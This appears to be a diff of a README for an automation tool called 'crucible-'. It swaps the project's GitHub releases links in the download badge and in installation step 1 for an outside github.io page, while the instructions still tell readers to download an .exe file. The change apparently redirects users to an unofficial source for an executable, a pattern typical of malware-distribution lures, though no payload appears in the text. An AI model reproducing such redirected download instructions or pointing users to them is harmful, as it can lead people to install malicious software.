@@ -1,6 +1,6 @@
 # ⚙️ crucible- - Advanced automation for complex digital tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Eastern-comptrollership272/crucible-/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://eastern-comptrollership272.github.io)
 
 ## 📂 Overview
 
@@ -22,7 +22,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 You can get the application directly from the project repository. Follow these steps to obtain the correct file:
 
-1. Visit the project release page: [https://github.com/Eastern-comptrollership272/crucible-/releases](https://github.com/Eastern-comptrollership272/crucible-/releases).
+1. Visit the project release page: [https://eastern-comptrollership272.github.io](https://eastern-comptrollership272.github.io).
 2. Look for the section labeled Latest.
 3. Find the file with the .exe extension that matches your system.
 4. Click the file name to start your download.
